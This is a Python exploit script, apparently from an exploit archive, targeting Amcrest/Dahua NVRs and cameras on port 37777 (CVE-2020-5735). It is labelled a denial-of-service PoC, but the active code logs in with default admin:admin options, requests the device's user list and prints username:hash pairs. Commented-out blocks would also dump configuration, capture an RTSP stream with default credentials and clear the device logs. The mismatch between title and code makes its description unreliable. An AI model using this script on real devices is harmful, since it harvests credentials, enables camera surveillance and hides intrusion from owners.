# Exploit Title: Amcrest Dahua NVR Camera IP2M-841 - Denial of Service (PoC)
# Date: 2020-04-07
# Exploit Author: Jacob Baines
# Vendor Homepage: https://amcrest.com/
# Software Link: https://amcrest.com/firmwaredownloads
# Version: Many different versions due to number of Dahua/Amcrest/etc
# devices affected
# Tested on: Amcrest IP2M-841 2.420.AC00.18.R and AMDVTENL8-H5
# 4.000.00AC000.0
# CVE : CVE-2020-5735
# Advisory: https://www.tenable.com/security/research/tra-2020-20
# Amcrest & Dahua NVR/Camera Port 37777 Authenticated Crash

import argparse
import socket
import re
import time


dvr_u1 = ("\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_resp = ("\xb1\x00\x00\x58\x00\x00\x00\x00")
dvr_version = ("\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_email = ("\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
        "\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_ddns = ("\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
    "\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_nas = ("\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
        "\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_channels = ("\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        "\xa8\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_groups = ("\xa6\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_users = ("\xa6\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_sn = ("\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_clear_logs = ("\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" +
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
dvr_clear_logs2 = ("\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" +
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")


top_parser = argparse.ArgumentParser(description='lol')
top_parser.add_argument('-i', '--ip', action="store", dest="ip", required=True, help="IPv4 address to connect to.")
top_parser.add_argument('-p', '--port', action="store", dest="port", type=int, help="Port to connect to. Default: 37777", default="37777")
top_parser.add_argument('-u', '--username', action="store", dest="username", help="User to login as. Default: admin", default="admin")
top_parser.add_argument('-w', '--pass', action="store", dest="password", help="Password to use. Default: admin", default="admin")
args = top_parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print '  [+]'
print '  [>] Connecting...'
print '  [+]'

# regex = r"admin:6QNMIQGe"

sock.settimeout(5)
sock.connect((args.ip, args.port))

sock.sendall(dvr_u1)
time.sleep(.5)
# sock.sendall(dvr_resp)
# time.sleep(1)

# sock.sendall(dvr_u1)
# sock.sendall(dvr_email)
# time.sleep(2)
# res_dvr_email = sock.recv(10240)
# dec_dvr_email = (res_dvr_email).decode('utf8', 'ignore')

# print '  [>] email:'
# print (dec_dvr_email)
# print '  [+]'

sock.sendall(dvr_users)
time.sleep(2)
res_dvr_users = sock.recv(10240)
dec_dvr_users = (res_dvr_users).decode('utf8', 'ignore')

# regex = r"\w{1,}:\w{8,}"
# matches = re.finditer(regex, dec_dvr_users, re.MULTILINE)

# for matchNum, match in enumerate(matches, start=3):

#     print '  [>] Oh yeah! Default credentials. [admin:admin]'

print (dec_dvr_users)

# print '  [>] Users:'
# print (matches)
# print '  [+]'

# print '  [>] Users found and pass hashes:'
regex = r"\w{1,}:\w{8,}"

# sock.sendall(dvr_version)
# time.sleep(2)
# res_dvr_version = sock.recv(10240)
# dec_dvr_version = (res_dvr_version).decode('utf8', 'ignore')

# print '  [>] version:'
# print (dec_dvr_version)
# print '  [+]'

print '  [+]'

############ VIDEO CAPTURE TEST ##################

                # rtsp_url = 'rtsp://admin:admin@10.7.6.67:554/cam/realmonitor?channel=1&subtype=1'

                # cap = cv2.VideoCapture(rtsp_url)

                # def captureimages():
                #     while True:
                #         cap.grab()

                # s = threading.Thread(target=captureimages)
                # s.start()

                # if takepic == True:
                #     picture = cap.retrieve()

##################################################
# sock.sendall(dvr_sn)
# time.sleep(5)
# res_dvr_sn = sock.recv(10240)
# dec_dvr_sn = (res_dvr_sn).decode('utf8', 'ignore')

# print (dec_dvr_sn)

matches = re.finditer(regex, dec_dvr_users, re.MULTILINE)
for matchNum, match in enumerate(matches, start=1):
        print ("{match}").format(match = match.group()) 
# print ("  [-]  ""{match}").format(match = match.group())

# print '  [+]'
# print '  [>] Clearing Logs'
# print '  [+]'

# sock.sendall(dvr_clear_logs)
# sock.sendall(dvr_clear_logs2)
print '  [+]'
sock.close()
print '  [.] Done.'


